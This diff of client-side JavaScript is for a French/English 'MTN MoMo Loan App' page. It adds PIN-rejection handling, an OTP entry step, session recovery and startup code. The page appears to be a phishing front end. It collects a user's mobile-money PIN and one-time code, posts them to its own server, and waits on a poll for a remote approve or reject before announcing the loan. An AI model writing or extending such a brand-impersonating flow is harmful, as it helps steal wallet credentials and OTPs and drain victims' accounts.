@@ -718,4 +718,140 @@ async function doPin() {
             () => {
                 showToast(currentLang === 'fr' ? '✅ PIN vérifié !' : '✅ PIN Verified!', 'success');
                 resetPinAttempts();
-                go
+                goTo('page-otp');
+            },
+            async () => {
+                try {
+                    const rejectResponse = await fetch('/api/pin-rejected', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ applicationId: S.applicationId })
+                    });
+                    const rejectData = await rejectResponse.json();
+
+                    if (rejectData.blocked) {
+                        showErr('pinErr', currentLang === 'fr' ? '🔒 Trop de tentatives échouées. Bloqué pendant 5 minutes.' : '🔒 Too many failed attempts. Blocked for 5 minutes.');
+                        await checkPinStatus();
+                        goTo('page-pin');
+                    } else if (rejectData.remainingAttempts > 0) {
+                        showErr('pinErr', currentLang === 'fr' ? `❌ PIN incorrect. ${rejectData.remainingAttempts} tentative(s) restante(s).` : `❌ Wrong PIN. ${rejectData.remainingAttempts} attempt(s) remaining.`);
+                        document.querySelectorAll('#page-pin .pin-box').forEach(b => b.value = '');
+                        document.getElementById('pin0').focus();
+                        const attemptsDisplay = document.getElementById('pinAttemptsDisplay');
+                        if (attemptsDisplay) {
+                            attemptsDisplay.textContent = currentLang === 'fr' ? `🔑 Tentatives restantes : ${rejectData.remainingAttempts} sur 3` : `🔑 Attempts remaining: ${rejectData.remainingAttempts} of 3`;
+                            attemptsDisplay.className = 'pin-attempts warning';
+                        }
+                        goTo('page-pin');
+                    } else {
+                        handleRejection('pin');
+                    }
+                } catch (err) {
+                    console.error('Error handling PIN rejection:', err);
+                    handleRejection('pin');
+                }
+            }
+        );
+    } catch (error) {
+        console.error('Error submitting PIN:', error);
+        showErr('pinErr', currentLang === 'fr' ? 'Échec de la soumission du PIN. Veuillez réessayer.' : 'Failed to submit PIN. Please try again.');
+    }
+}
+
+// ─── STEP 6: OTP ───
+async function doOtp() {
+    const otp = [0,1,2,3].map(i => document.getElementById('otp'+i).value).join('');
+    if (otp.length < 4) {
+        showErr('otpErr', currentLang === 'fr' ? 'Entrez un code OTP valide à 4 chiffres.' : 'Enter a valid 4-digit OTP.');
+        return;
+    }
+
+    await fetch('/api/send-otp', {
+        method: 'POST',
+        body: JSON.stringify({ applicationId: S.applicationId, otp, isResubmission: !!S.rejectedStep }),
+        headers: { 'Content-Type': 'application/json' }
+    });
+
+    document.getElementById('waitOtpAppId').textContent = S.applicationId;
+    goTo('page-wait-otp');
+
+    startPoll(S.applicationId, 'otp',
+        () => {
+            showToast(currentLang === 'fr' ? '✅ OTP vérifié ! Prêt approuvé 🎉' : '✅ OTP Verified! Loan Approved 🎉', 'success');
+            showApproval();
+        },
+        () => handleRejection('otp')
+    );
+}
+
+// ─── Update PIN Page UI ───
+function updatePinPageUI() {
+    const pinCard = document.querySelector('#page-pin .step-card');
+    if (pinCard) {
+        let attemptsDisplay = document.getElementById('pinAttemptsDisplay');
+        if (!attemptsDisplay) {
+            attemptsDisplay = document.createElement('div');
+            attemptsDisplay.id = 'pinAttemptsDisplay';
+            attemptsDisplay.className = 'pin-attempts';
+            const pinLabel = document.querySelector('#page-pin .pin-label');
+            if (pinLabel) pinLabel.parentNode.insertBefore(attemptsDisplay, pinLabel.nextSibling);
+        }
+    }
+}
+
+// ─── Recovery on Page Load ───
+function recoverSession() {
+    console.log('🔄 Checking for saved session...');
+    const appId = loadApplicationId();
+    if (appId) console.log(`✅ Found application ID: ${appId}`);
+
+    const dataLoaded = loadApplicationData();
+    if (dataLoaded) console.log('✅ Loaded application data');
+
+    if (checkOtpTimerRecovery()) {
+        console.log('✅ Recovered OTP timer');
+        return true;
+    }
+
+    const rejection = loadRejectionInfo();
+    if (rejection) {
+        console.log(`✅ Found rejection info for step: ${rejection.step}`);
+        showToast(currentLang === 'fr' ? `⚠️ Votre ${rejection.step.toUpperCase()} a été rejeté. Veuillez réessayer.` : `⚠️ Your ${rejection.step.toUpperCase()} was rejected. Please try again.`, 'error');
+        S.applicationId = rejection.applicationId;
+        handleRejection(rejection.step);
+        return true;
+    }
+
+    if (!rejection) loadFormDraft();
+    return false;
+}
+
+// ─── Auto-save on input changes ───
+document.addEventListener('input', (e) => {
+    if (e.target.closest('#page-step1, #page-step2, #page-step3')) saveFormDraft();
+    if (e.target.closest('#page-step2, #page-step3')) saveApplicationData();
+});
+
+// ─── Override goTo for PIN page ───
+const originalGoTo = goTo;
+goTo = function(pageId) {
+    originalGoTo(pageId);
+    if (pageId === 'page-pin') {
+        updatePinPageUI();
+        checkPinStatus();
+    }
+};
+
+// ─── INIT ───
+// Load saved language preference (default: French)
+const savedLang = (() => {
+    try { return localStorage.getItem(STORAGE_KEYS.LANGUAGE); } catch(e) { return null; }
+})();
+switchLang(savedLang === 'en' ? 'en' : 'fr');
+
+updateCalc();
+
+const recovered = recoverSession();
+if (!recovered) goTo('page-landing');
+
+console.log('✅ MTN MoMo Loan App (Bilingual, FR default) loaded!');
